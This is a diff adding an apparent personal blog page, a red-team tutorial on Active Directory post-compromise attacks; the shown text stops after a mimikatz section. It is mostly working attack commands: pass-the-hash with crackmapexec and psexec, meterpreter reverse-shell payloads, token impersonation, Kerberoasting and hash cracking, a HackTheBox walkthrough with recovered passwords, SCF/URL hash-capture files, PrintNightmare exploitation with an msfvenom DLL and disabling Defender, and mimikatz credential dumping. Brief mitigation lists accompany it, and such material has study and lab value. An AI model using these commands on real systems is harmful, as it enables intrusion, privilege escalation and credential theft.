@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://auti.dev/images/favicon/favicon.ico" />
+<title>Compromising AD - Part 3: Post Compromise Attacks | auti.dev   ≽^._.^≼ ∫</title>
+<meta name="title" content="Compromising AD - Part 3: Post Compromise Attacks" />
+<meta name="description" content="Post-Compromise Attacks Post-Compromise Attacks passthehash ??? WTF Mitigations Token-Impersonation What are tokens? Two types Setup Mitigations Kerberoasting Kerberoast? Mitigations GPP-cPassword-Attacks Group Policy Preferences Attack aka MS14-025 Resources Setup Exploiting &ldquo;Active&rdquo; Machine on HacktheBox Privesc that Machine! Mitigations URL-File-Attacks SCF and URL file attack against writeable share Mitigations Print-Nightmare Resources Exploit Mitigation - just disable the damn service! Installation Exploit Mimikatz What&rsquo;s that? Resources Exploit Golden-Ticket-Attack What is a Golden Ticket? Exploit Mitigations Zero-Logon aka CVE-2020-1472 Resources Exploit Mitigations Next &gt;&gt; Part 4: Post Exploitation passthehash If we crack a password and/or dump the SAM Hashes, we can leverage both for lateral movement in networks!" />
+<meta name="keywords" content="active-directory,cybersecurity,windows,red-teaming," />
+
+
+<meta property="og:title" content="Compromising AD - Part 3: Post Compromise Attacks" />
+<meta property="og:description" content="Post-Compromise Attacks Post-Compromise Attacks passthehash ??? WTF Mitigations Token-Impersonation What are tokens? Two types Setup Mitigations Kerberoasting Kerberoast? Mitigations GPP-cPassword-Attacks Group Policy Preferences Attack aka MS14-025 Resources Setup Exploiting &ldquo;Active&rdquo; Machine on HacktheBox Privesc that Machine! Mitigations URL-File-Attacks SCF and URL file attack against writeable share Mitigations Print-Nightmare Resources Exploit Mitigation - just disable the damn service! Installation Exploit Mimikatz What&rsquo;s that? Resources Exploit Golden-Ticket-Attack What is a Golden Ticket? Exploit Mitigations Zero-Logon aka CVE-2020-1472 Resources Exploit Mitigations Next &gt;&gt; Part 4: Post Exploitation passthehash If we crack a password and/or dump the SAM Hashes, we can leverage both for lateral movement in networks!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://auti.dev/compromising-ad-part-3-post-compromise-attacks/" /><meta property="og:image" content="https://auti.dev/images/share.png"/><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2021-08-16T12:35:53+05:30" />
+<meta property="article:modified_time" content="2021-08-16T12:35:53+05:30" /><meta property="og:site_name" content="auti.dev   ≽^._.^≼ ∫" />
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://auti.dev/images/share.png"/>
+
+<meta name="twitter:title" content="Compromising AD - Part 3: Post Compromise Attacks"/>
+<meta name="twitter:description" content="Post-Compromise Attacks Post-Compromise Attacks passthehash ??? WTF Mitigations Token-Impersonation What are tokens? Two types Setup Mitigations Kerberoasting Kerberoast? Mitigations GPP-cPassword-Attacks Group Policy Preferences Attack aka MS14-025 Resources Setup Exploiting &ldquo;Active&rdquo; Machine on HacktheBox Privesc that Machine! Mitigations URL-File-Attacks SCF and URL file attack against writeable share Mitigations Print-Nightmare Resources Exploit Mitigation - just disable the damn service! Installation Exploit Mimikatz What&rsquo;s that? Resources Exploit Golden-Ticket-Attack What is a Golden Ticket? Exploit Mitigations Zero-Logon aka CVE-2020-1472 Resources Exploit Mitigations Next &gt;&gt; Part 4: Post Exploitation passthehash If we crack a password and/or dump the SAM Hashes, we can leverage both for lateral movement in networks!"/>
+
+
+
+<meta itemprop="name" content="Compromising AD - Part 3: Post Compromise Attacks">
+<meta itemprop="description" content="Post-Compromise Attacks Post-Compromise Attacks passthehash ??? WTF Mitigations Token-Impersonation What are tokens? Two types Setup Mitigations Kerberoasting Kerberoast? Mitigations GPP-cPassword-Attacks Group Policy Preferences Attack aka MS14-025 Resources Setup Exploiting &ldquo;Active&rdquo; Machine on HacktheBox Privesc that Machine! Mitigations URL-File-Attacks SCF and URL file attack against writeable share Mitigations Print-Nightmare Resources Exploit Mitigation - just disable the damn service! Installation Exploit Mimikatz What&rsquo;s that? Resources Exploit Golden-Ticket-Attack What is a Golden Ticket? Exploit Mitigations Zero-Logon aka CVE-2020-1472 Resources Exploit Mitigations Next &gt;&gt; Part 4: Post Exploitation passthehash If we crack a password and/or dump the SAM Hashes, we can leverage both for lateral movement in networks!"><meta itemprop="datePublished" content="2021-08-16T12:35:53+05:30" />
+<meta itemprop="dateModified" content="2021-08-16T12:35:53+05:30" />
+<meta itemprop="wordCount" content="2188"><meta itemprop="image" content="https://auti.dev/images/share.png"/>
+<meta itemprop="keywords" content="active-directory,cybersecurity,windows,red-teaming," />
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  body {
+    font-family: 'Inter', sans-serif;
+    margin: auto;
+    padding: 10px;
+    max-width: 720px;
+    text-align: left;
+    background-color: #fff;
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: #444;
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6,
+  strong,
+  b {
+    color: #222;
+  }
+
+  a {
+    color: #3273dc;
+     
+  }
+
+  .title {
+    text-decoration: none;
+    border: 0;
+  }
+
+  .title span {
+    font-weight: 400;
+  }
+
+  nav a {
+    margin-right: 10px;
+  }
+
+  textarea {
+    width: 100%;
+    font-size: 16px;
+  }
+
+  input {
+    font-size: 16px;
+  }
+
+  content {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    padding: 2px 5px;
+    background-color: #f2f2f2;
+    font-family: 'Fira Code', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto Mono', 'Cascadia Code', Courier, monospace;
+  }
+
+  pre code {
+    color: #222;
+    display: block;
+    padding: 20px;
+    white-space: pre-wrap;
+    font-size: 14px;
+    overflow-x: auto;
+  }
+
+  div.highlight pre {
+    background-color: initial;
+    color: initial;
+  }
+
+  div.highlight code {
+    background-color: unset;
+    color: unset;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: #222;
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px;
+    text-align: center;
+  }
+
+  .helptext {
+    color: #777;
+    font-size: small;
+  }
+
+  .errorlist {
+    color: #eba613;
+    font-size: small;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: rgba(230, 52, 52, 0.75);
+;
+  }
+
+   
+
+</style>
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+<style>
+
+     
+     
+     
+     
+     
+     
+
+    body {
+        font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    }
+
+    h1 {
+        font-weight: 900;
+    }
+
+    h2 {
+        font-weight: 800;
+    }
+
+    h3 {
+        font-weight: 700;
+    }
+
+    h4 {
+        font-weight: 600;
+    }
+
+    a {
+        color: rgba(230, 52, 52, 0.75);
+        text-decoration: none;
+        position: relative;
+        transition: width 0.5s ease;
+    }
+
+    a::before {
+        content: '';
+        position: absolute;
+        bottom: -2px;
+        left: 0;
+        width: 0;
+        height: 1px;
+        background-color: rgb(230, 52, 52);
+        transition: width 0.5s ease;
+    }
+
+    a:hover {
+        color: rgba(230, 52, 52, 1);
+        transition: width 0.5s ease;
+    }
+    a:hover::before {
+        width: 100%;  
+    }
+
+    .title:hover::before {
+        width: 0% !important;
+    }
+
+    .iframe-container {
+        display: flex;
+        align-items: center;
+    }
+
+</style></head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>auti.dev   ≽^._.^≼ ∫</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+
+<a href="/talk">Talks</a>
+
+
+<a href="/project">Projects</a>
+</nav>
+</header>
+  <main>
+
+<h1>Compromising AD - Part 3: Post Compromise Attacks</h1>
+<p>
+  <i>
+    <time datetime='2021-08-16' pubdate>
+      16 Aug, 2021
+    </time>
+  </i>
+</p>
+
+<content>
+  <h1 id="post-compromise-attacks">Post-Compromise Attacks</h1>
+<hr>
+<ul>
+<li><a href="#post-compromise-attacks">Post-Compromise Attacks</a>
+<ul>
+<li><a href="#passthehash">passthehash</a>
+<ul>
+<li><a href="#-wtf">??? WTF</a></li>
+<li><a href="#mitigations">Mitigations</a></li>
+</ul>
+</li>
+<li><a href="#token-impersonation">Token-Impersonation</a>
+<ul>
+<li><a href="#what-are-tokens">What are tokens?</a></li>
+<li><a href="#two-types">Two types</a></li>
+<li><a href="#setup">Setup</a></li>
+<li><a href="#mitigations-1">Mitigations</a></li>
+</ul>
+</li>
+<li><a href="#kerberoasting">Kerberoasting</a>
+<ul>
+<li><a href="#kerberoast">Kerberoast?</a></li>
+<li><a href="#mitigations-2">Mitigations</a></li>
+</ul>
+</li>
+<li><a href="#gpp-cpassword-attacks">GPP-cPassword-Attacks</a>
+<ul>
+<li><a href="#group-policy-preferences-attack-aka-ms14-025">Group Policy Preferences Attack aka MS14-025</a></li>
+<li><a href="#resources">Resources</a></li>
+<li><a href="#setup-1">Setup</a></li>
+<li><a href="#exploiting-active-machine-on-hackthebox">Exploiting &ldquo;Active&rdquo; Machine on HacktheBox</a></li>
+<li><a href="#privesc-that-machine">Privesc that Machine!</a></li>
+<li><a href="#mitigations-3">Mitigations</a></li>
+</ul>
+</li>
+<li><a href="#url-file-attacks">URL-File-Attacks</a>
+<ul>
+<li><a href="#scf-and-url-file-attack-against-writeable-share">SCF and URL file attack against writeable share</a></li>
+<li><a href="#mitigations-4">Mitigations</a></li>
+</ul>
+</li>
+<li><a href="#print-nightmare">Print-Nightmare</a>
+<ul>
+<li><a href="#resources-1">Resources</a></li>
+<li><a href="#exploit">Exploit</a></li>
+<li><a href="#mitigation---just-disable-the-damn-service">Mitigation - just disable the damn service!</a></li>
+<li><a href="#installation">Installation</a></li>
+<li><a href="#exploit-1">Exploit</a></li>
+</ul>
+</li>
+<li><a href="#mimikatz">Mimikatz</a>
+<ul>
+<li><a href="#whats-that">What&rsquo;s that?</a></li>
+<li><a href="#resources-2">Resources</a></li>
+<li><a href="#exploit-2">Exploit</a></li>
+</ul>
+</li>
+<li><a href="#golden-ticket-attack">Golden-Ticket-Attack</a>
+<ul>
+<li><a href="#what-is-a-golden-ticket">What is a Golden Ticket?</a></li>
+<li><a href="#exploit-3">Exploit</a></li>
+<li><a href="#mitigations-5">Mitigations</a></li>
+</ul>
+</li>
+<li><a href="#zero-logon">Zero-Logon</a>
+<ul>
+<li><a href="#aka-cve-2020-1472">aka CVE-2020-1472</a></li>
+<li><a href="#resources-3">Resources</a></li>
+<li><a href="#exploit-4">Exploit</a></li>
+</ul>
+</li>
+<li><a href="#mitigations-6">Mitigations</a></li>
+<li><a href="#next--part-4-post-exploitation">Next &gt;&gt; Part 4: Post Exploitation</a></li>
+</ul>
+</li>
+</ul>
+<br>
+<h2 id="passthehash">passthehash</h2>
+<hr>
+<p>If we crack a password and/or dump the SAM Hashes, we can leverage both for lateral movement in networks!</p>
+<br>
+<h3 id="-wtf">??? WTF</h3>
+<p>we gotta use a tool called crackmapexec</p>
+<pre><code>apt install crackmapexec
+</code></pre>
+<p>PASS THE PASS!</p>
+<pre><code>crackmapexec smb {ip} -u {username} -d {domain} -p {password} --sam
+
+crackmapexec smb 192.168.0.69/16 -u Thanos -d MARVEL -p 1nf1n1ty_Gauntl3t --sam
+</code></pre>
+<p>OR PASS THE HASH!</p>
+<pre><code>crackmapexec smb 192.168.0.69/16 -u Spiderman -H hash69f420x31337u --local-auth --sam
+
+	--local-auth passes locally
+	--sam dumps the SAM file
+</code></pre>
+<p>So, crackmapexec throws the password all around the subnet</p>
+<p>AND the ISSUE is a lot of ADMINS will use the SAME PASSWORDS for machines (Especially LOCAL MACHINES)</p>
+<p><em>Now, use smbexec, wmiexec, psexec or Metasploit to break in!</em></p>
+<pre><code>psexec.py domain/user:password@ip 
+</code></pre>
+<p>secretsdump: dump SAM hashes :)</p>
+<pre><code>psexec.py domain/user:password@ip 
+</code></pre>
+<p>psxec with hashes</p>
+<pre><code>psexec.py user@ip --hashes LMHASH:NTHASH
+</code></pre>
+<br>
+<h3 id="mitigations">Mitigations</h3>
+<ul>
+<li>
+<p>Limit account re-use:</p>
+<ul>
+<li>Avoid re-using local admin password</li>
+<li>Disable Guest and Administrator accounts</li>
+<li>Limit who is a local administrator (least privilege)</li>
+</ul>
+</li>
+<li>
+<p>Utilize strong passwords:</p>
+<ul>
+<li>The longer the better (&gt;14 characters)</li>
+<li>Avoid using common words</li>
+</ul>
+</li>
+<li>
+<p>Privilege Access Management (PAM)</p>
+<ul>
+<li>Check out/in sensitive accounts when needed</li>
+<li>Automatically rotate passwords on check out and check in</li>
+<li>Limits pass attacks as hash/password is strong and constantly rotated</li>
+</ul>
+</li>
+</ul>
+<br>
+<h2 id="token-impersonation">Token-Impersonation</h2>
+<hr>
+<h3 id="what-are-tokens">What are tokens?</h3>
+<p>Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.</p>
+<br> 
+<h3 id="two-types">Two types</h3>
+<ul>
+<li>Delegate - Created for logging into a machine or using Remote Desktop</li>
+<li>Impersonate - &ldquo;non-interactive&rdquo; such as attaching a network drive or a domain logon script</li>
+</ul>
+<br>
+<h3 id="setup">Setup</h3>
+<ul>
+<li>
+<p>Set up msfconsole</p>
+<pre><code>  use exploit/windows/smb/psexec
+
+  options
+
+  set RHOSTS
+
+  set smbdomain
+
+  set smbuser
+
+  set smbpass
+
+  show targets
+
+  set target {Native Upload}
+
+  set payload windows/x64/meterpreter/reverse_tcp
+
+  options
+
+  set LHOSTS
+
+  run
+</code></pre>
+</li>
+</ul>
+<br>
+<ul>
+<li>
+<p>Token Impersanation Attack</p>
+<pre><code>  load incognito
+
+  list_tokens -u
+
+  impersonate_token MARVEL\\Administrator
+
+  shell
+
+  whoami
+
+  hashdump
+
+  rev2self # if hashdump command doesnt work
+
+  hashdump
+</code></pre>
+</li>
+</ul>
+<br>
+<h3 id="mitigations-1">Mitigations</h3>
+<ul>
+<li>
+<p>Limit user/group token creation permissions</p>
+</li>
+<li>
+<p>Local Admin Restriction</p>
+</li>
+<li>
+<p>Account tiering
+<a href="https://www.ravenswoodtechnology.com/how-to-mitigate-privilege-escalation-with-the-tiered-access-model-for-active-directory-security/">https://www.ravenswoodtechnology.com/how-to-mitigate-privilege-escalation-with-the-tiered-access-model-for-active-directory-security/</a></p>
+</li>
+</ul>
+<br>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<hr>
+<h3 id="kerberoast">Kerberoast?</h3>
+<p><img src="https://auti.dev/images/blog/compromising-ad/Kerberoasting.png" alt=""></p>
+<br>
+<p>Goal: Get the Ticket Granting Service (TGS) and <strong>decrypt server&rsquo;s account hash!</strong></p>
+<p>We have a <strong>Domain Controller</strong> - Which is Key Distribution Center <strong>(KDC)</strong>.
+We have a <strong>Application Server</strong> (MySQL, Antivirus, etc)</p>
+<pre><code>1. Victim User Requests a Ticket Granting Ticket (TGT), I am gonna provide my NTLM hash.
+
+2. Domain Controller Sends the Ticket Back, encrypted with Kerberoast Ticket Granting Ticket (krbtgt) hash.
+</code></pre>
+<p>Wait! How did we get the <strong>Ticket</strong>? - Because of <strong>NTLM hash</strong> (meaning we have a username and password).</p>
+<p>Remember <strong>Application Server</strong>? It is running a service and we have something called <strong>Service Principal Name (SPN)</strong>.</p>
+<pre><code>3. In order to access the service, we have to first request a Ticket Granting Service (TGS).
+</code></pre>
+<p>How do we <strong>request</strong> Ticket Granting Service (TGS)? - We <strong>provide</strong> Ticket Granting Ticket (TGT).</p>
+<pre><code>4. The Server Knowns Server Account Hash, so it's going to ENCRYPT TGS and send it to Victim.
+</code></pre>
+<p>Note that the <strong>KDC does not know we have access to the server!</strong></p>
+<br>
+<p>In order to authenticate to that server, <strong>we present that TGS</strong> to Application Server, and the <strong>Server will decrypt it using their own Server Hash</strong>! (It will Validate - Yes/No)</p>
+<p>Well we have a <strong>TGS</strong> and we can <strong>CRACK THE HASH!</strong></p>
+<p>We gonna use a tool called <strong>GetUserSPNs.py</strong> (Impacket)</p>
+<pre><code>python3 GetUserSPNs.py {domain}/{username}:{password} -dc-ip {ip} -request
+</code></pre>
+<p>It will Return the <strong>HASH</strong></p>
+<pre><code>crack it with Hashcat!
+
+hashcat --help | grep Kerberos
+
+13100	-	Kerberos 5 TGS
+
+hashcat -m 13100 hash.txt rockyou.txt -O
+
+-O for optimize
+</code></pre>
+<p>We now have the Password for the SERVICE :)</p>
+<br>
+<h3 id="mitigations-2">Mitigations</h3>
+<ul>
+<li>Strong Passwords</li>
+<li>Least Privilege (Don&rsquo;t make Service Accounts as Domain Administrators lol)</li>
+</ul>
+<br>
+<h2 id="gpp-cpassword-attacks">GPP-cPassword-Attacks</h2>
+<hr>
+<h3 id="group-policy-preferences-attack-aka-ms14-025">Group Policy Preferences Attack aka MS14-025</h3>
+<p>GPP allowed admins to create policies using <strong>embedded</strong> credentials.</p>
+<p>These credentials were encrypted and <strong>stored in &ldquo;cPassword&rdquo;</strong>.</p>
+<p>The way <strong>SYSVOL</strong> works is that it is <strong>storing groups.xml file</strong>, and <strong>in that</strong> XML file, you find that <strong>cPassword!</strong></p>
+<p>The <strong>key</strong> to this encryption <strong>was accidentally released</strong>.</p>
+<p><strong>Patched</strong> in <strong>MS14-025</strong>, but doesn&rsquo;t prevent previous uses.</p>
+<br>
+<h3 id="resources">Resources</h3>
+<p><a href="https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/">https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/</a></p>
+<br>
+<h3 id="setup-1">Setup</h3>
+<ul>
+<li>
+<p><strong>Using Metaspolit Module</strong></p>
+<pre><code>  smb_enum_gpp
+</code></pre>
+<p><img src="https://auti.dev/images/blog/compromising-ad/gppmsf.png" alt=""></p>
+</li>
+<li>
+<p>**or getting the <code>groups.xml</code> manaully and then using ** <code>gpp-decrypt</code> <strong>tool on Linux</strong></p>
+<p><img src="https://auti.dev/images/blog/compromising-ad/gppdecrypt.png" alt=""></p>
+</li>
+</ul>
+<br>
+<h3 id="exploiting-active-machine-on-hackthebox">Exploiting &ldquo;Active&rdquo; Machine on HacktheBox</h3>
+<p>Active Machine Link: <a href="https://app.hackthebox.eu/machines/148">https://app.hackthebox.eu/machines/148</a></p>
+<p>nmap scan</p>
+<pre><code>nmap -T5 10.10.10.100
+</code></pre>
+<p>Notice the open ports</p>
+<pre><code>53		domain
+88		Kerberos-sec
+389 	ldap
+445* 	microsoft-ds
+636		ldapssl
+</code></pre>
+<p>You may try msf module <code>smb_enum_gpp</code></p>
+<p>OR Just manually get the groups.xml file!</p>
+<p>Look at 445, the attack involves <strong>using SMB</strong> (which contains <strong>SYSVOL Folder</strong>)</p>
+<p>Lets Go!</p>
+<pre><code>smbclient -L \\\\10.10.10.100\\
+</code></pre>
+<p>Lets Connect using <strong>Replication</strong></p>
+<pre><code>smbclient -L \\\\10.10.10.100\\Replication
+</code></pre>
+<p>We got <strong>Access</strong> to dat machine!</p>
+<p>Now <strong>change some settings</strong>:</p>
+<pre><code>prompt off
+
+recurse on
+</code></pre>
+<p><strong>Grab</strong> them Files!</p>
+<pre><code>mget *
+</code></pre>
+<p>We see <strong>Groups.xml</strong>, we have</p>
+<pre><code>name=&quot;active.htb\SVC_TGS&quot;
+cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;
+</code></pre>
+<p>now :) <strong>Pro Gamer Move!</strong></p>
+<pre><code>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+GPPstillStandingStrong2k18
+</code></pre>
+<p>But note that <code>\\Replication</code> doesn&rsquo;t always work, so <strong>try getting a Domain User Account!</strong></p>
+<h3 id="privesc-that-machine">Privesc that Machine!</h3>
+<pre><code>psexec.py active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100
+</code></pre>
+<p>We see that <strong>nothing is Writable :(</strong></p>
+<p>Let&rsquo;s try <strong>Kerberoasting</strong> (Hint: SVC_TGS is <strong>Ticket Granting Service!</strong>)</p>
+<pre><code>GetUsersSPN.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+</code></pre>
+<p>Whoa! We got a <strong>Service Ticket</strong>! Crack that <strong>Hash</strong>!</p>
+<pre><code>Administrator:Ticketmaster1968
+</code></pre>
+<p>:)</p>
+<pre><code>psexec.py active.htb/Administrator:Ticketmaster@10.10.10.100
+</code></pre>
+<p><strong>Get da Flag!</strong></p>
+<br>
+<h3 id="mitigations-3">Mitigations</h3>
+<ul>
+<li>Perform an accounting of group policies that apply credentials.</li>
+<li>A search of the SYSVOL share for the files that contain the credentials can also be performed with a script. Microsoft even supplies such a script in kb article 2962486 (<a href="https://support.microsoft.com/en-us/kb/2962486">https://support.microsoft.com/en-us/kb/2962486</a>).</li>
+<li>If GPPs are used to apply local administrator accounts, Microsoft also has the Local Administrator Password Solution (LAPS) tool (<a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899">https://www.microsoft.com/en-us/download/details.aspx?id=46899)</a>) to help provision these accounts without group policy preferences.</li>
+</ul>
+<br>
+<h2 id="url-file-attacks">URL-File-Attacks</h2>
+<hr>
+<p>After <strong>Compromising</strong> a user, suppose the user has <strong>SHARE ACCESS</strong> we can <strong>utilize</strong> that <strong>access</strong> to <strong>crack more hashes</strong> via a <strong>Responder</strong> (Potential Privesc)</p>
+<br>
+<p>SCF Attack - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share</a></p>
+<br>
+<h3 id="scf-and-url-file-attack-against-writeable-share">SCF and URL file attack against writeable share</h3>
+<p>Drop the following <code>@something.scf</code> file inside a share and start listening with Responder : <code>responder -wrf --lm -v -I eth0</code></p>
+<pre><code>[Shell]
+Command=2
+IconFile=\\{IP}\Share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre>
+<p>This attack also works with <code>.url</code> files and <code>responder -I eth0 -v</code>.
+say <code>@test.url</code></p>
+<pre><code>[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\{IP}\%USERNAME%.icon
+IconIndex=1
+</code></pre>
+<h3 id="mitigations-4">Mitigations</h3>
+<ul>
+<li>UH, Just don&rsquo;t fall for it!</li>
+</ul>
+<br>
+<h2 id="print-nightmare">Print-Nightmare</h2>
+<hr>
+<p>Takes advantage of the <strong>Printer Spooler</strong>, which has some functionality which <strong>allows the users</strong> to add <strong>Printers</strong>, which runs as a <strong>SYSTEM PRIVILEGE!</strong>.</p>
+<p>Because of which any sort of <strong>Autheticated Attacker</strong> can run <strong>CODE EXECUTIONS</strong> as <strong>PRIVILEGED USER!</strong> XD</p>
+<br>
+<h3 id="resources-1">Resources</h3>
+<p>cube0x0 RCE - <a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p>
+<p>calebstewart LPE - <a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></p>
+<h3 id="exploit">Exploit</h3>
+<ul>
+<li>
+<p>Check if Vulnerable: use rpcdump.py</p>
+<pre><code>  rpcdump.py @{IP} | egrep 'MS-RPRN|MS-PAR'
+</code></pre>
+<p>If we get those results back, we vulnerable :(</p>
+</li>
+</ul>
+<h3 id="mitigation---just-disable-the-damn-service">Mitigation - just disable the damn service!</h3>
+<pre><code>Stop-Service Spooler
+REG ADD  &quot;HKLM\SYSTEM\CurrentControlSet\Services\Spooler&quot;  /v &quot;Start&quot; /t REG_DWORD /d &quot;4&quot; /f
+</code></pre>
+<h3 id="installation">Installation</h3>
+<p>Before running the exploit you need to install new version of Impacket</p>
+<pre><code>pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+</code></pre>
+<p>Get that CVE Script</p>
+<pre><code>wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py
+</code></pre>
+<br>
+<h3 id="exploit-1">Exploit</h3>
+<pre><code>{ip} =&gt; Our Attacker's IP
+{dcip} =&gt; Domain Controller's IP
+</code></pre>
+<p>Now we&rsquo;re going to run that script with a malicious <code>.dll</code></p>
+<p>AND we&rsquo;re going to host that <code>.dll </code></p>
+<pre><code>/CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
+
+./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
+</code></pre>
+<p>Generate a payload, using <code>msfvenom</code></p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f dll &gt; shell.dll
+</code></pre>
+<p>Now get a meterpreter session</p>
+<pre><code>msfconsole
+
+use multi/handler
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+options
+
+set LPORT=4444 and LHOST={ip}
+
+run
+</code></pre>
+<p>Share the <code>shell.dll</code> file</p>
+<pre><code>smbserver.py share `pwd` -smb2support
+
+`pwd` shares the current entire directory
+</code></pre>
+<p>So now we need to have</p>
+<pre><code>python3 CVE-2021-1675.py MARVEL.local/fcastle:Password1@{dcip} '\\{ip}\share\shell.dll' 
+</code></pre>
+<p>We get Windows Defender Error!</p>
+<p>Let&rsquo;s turn off defender and try again! Now, we successfully get the shell access :)</p>
+<pre><code>getuid
+	Server username: NT AUTHORITY\SYSTEM
+
+hashdump
+</code></pre>
+<p>TF? Windows Defender?</p>
+<p>You can Bypass AV, it&rsquo;s all because of <code>.dll</code></p>
+<p>Check this Article: <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html">https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html</a></p>
+<br>
+<h2 id="mimikatz">Mimikatz</h2>
+<hr>
+<h3 id="whats-that">What&rsquo;s that?</h3>
+<ul>
+<li>
+<p>Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks!</p>
+</li>
+<li>
+<p>Dumps credentials stored in memory.</p>
+</li>
+<li>
+<p>Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass the-Ticket, Golden Ticket, Silver Ticket!</p>
+</li>
+</ul>
+<h3 id="resources-2">Resources</h3>
+<p>Mimikatz: <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<p>Special Notes:</p>
+<ul>
+<li>
+<p>This thing is <strong>flagged</strong> by Microsoft Windows and would <strong>show up like &ldquo;Unsafe Website&rdquo;</strong> on Edge (I believe that&rsquo;s the name of their browser) because of Security Issues XD.</p>
+</li>
+<li>
+<p>Windows releases <strong>updates</strong> and <strong>patches</strong> for this attacks <strong>frequently</strong>, so be <strong>up-to-date</strong> with this thing.</p>
+</li>
+<li>
+<p>It&rsquo;s a <em><strong>powerful</strong></em> tool!</p>
+</li>
+</ul>
+<h3 id="exploit-2">Exploit</h3>
+<p>Mimikatz Wiki: <a href="https://github.com/gentilkiwi/mimikatz/wiki">https://github.com/gentilkiwi/mimikatz/wiki</a></p>
+<p>Fire up <strong>cmd</strong></p>
+<pre><code>mimikatz.exe
+privilege::debug
+</code></pre>
+<p>Here, <strong>privilege</strong> is a <strong>module</strong> and debug means that it is allowing us to debug a process</p>
+<p>Expected Outcome:</p>
+<pre><code>Privilege '20' OK
+</code></pre>
+<p>Now we&rsquo;re going to attempt to <strong>dump some information out of memory</strong></p>
+<p>Since we have <strong>Privilege Debug on</strong>, now let&rsquo;s do some attacks!</p>
+<pre><code>sekurlsa::logonpasswords
+</code></pre>
+<p>Tip: We can <strong>pass the NTLM hash</strong> around</p>
+<p>In the wdigest section we can see</p>
+<pre><code>Password : (null)
+</code></pre>
+<p>Well in <strong>Windows 7</strong>, by default <strong>wdigest feature</strong> was on which stored <strong>passwords in clear text!</strong></p>
+<p>But in later versions of Windows they <strong>patched</strong> it (nah they <strong>just turned it off</strong>, mega big brain)</p>
+<p>We can <strong>turn on</strong> that feature using <strong>mimikatz</strong>!</p>
+<p>We can also <strong>dump sam</strong></p>
+<pre><code>lsadump::sam
+</code></pre>
+<p>We can **dump lsa **</p>
+<p><strong>Local Security Authority</strong>, is a protected <strong>sub-system</strong> in Windows Authentication, which <strong>Autheticates Logon Sessions</strong> to the <strong>Local Computer</strong></p>
+<pre><code>lsadump::lsa /patch
+</code></pre>
+<p><strong>NTDS.dit</strong> will also contain credentials</p>
+<pre><code>ntds.dit
+</code></pre>
+<br>
